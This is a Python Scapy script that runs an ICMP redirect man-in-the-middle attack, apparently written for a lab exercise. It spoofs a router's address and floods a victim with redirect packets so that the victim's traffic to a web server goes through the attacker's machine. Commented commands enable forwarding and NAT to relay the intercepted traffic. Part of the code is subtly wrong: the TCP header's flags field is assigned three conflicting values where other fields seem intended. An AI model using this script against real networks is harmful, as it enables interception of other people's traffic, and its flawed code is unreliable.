#!/usr/bin/env python
from scapy.all import *
# echo 1 > /proc/sys/net/ipv4/ip_forward
# iptables -t nat -A POSTROUTING -s 10.100.13.0/255.255.255.0 -o tap0 -j MASQUERADE

# Variables
originalRouterIP = '10.10.10.1'
attackerIP = '<VPN IP>'
victimIP = '<Victim IP Address>'
serverIP = '<Web Server IP Address>'

# Creating and sending ICMP redirect packets
ip = IP()
ip.src = originalRouterIP
ip.dst = victimIP
icmpRedirect = ICMP()
icmpRedirect.type = 5
icmpRedirect.code = 1
icmpRedirect.gw = attackerIP

# ICMP packet payload /shoudl container original TCP SYN Packet
# Sent from victimIP
redirPayloadIP = IP()
redirPayloadIP.src = victimIP
redirPayloadIP.dst = serverIP
fakeOriginalTCPSYN = TCP()
fakeOriginalTCPSYN.flags = "S"
fakeOriginalTCPSYN.dport = 80
fakeOriginalTCPSYN.flags = 444444444
fakeOriginalTCPSYN.flags = 55555

while True:
    send(ip/icmpRedirect/redirPayloadIP/fakeOriginalTCPSYN)

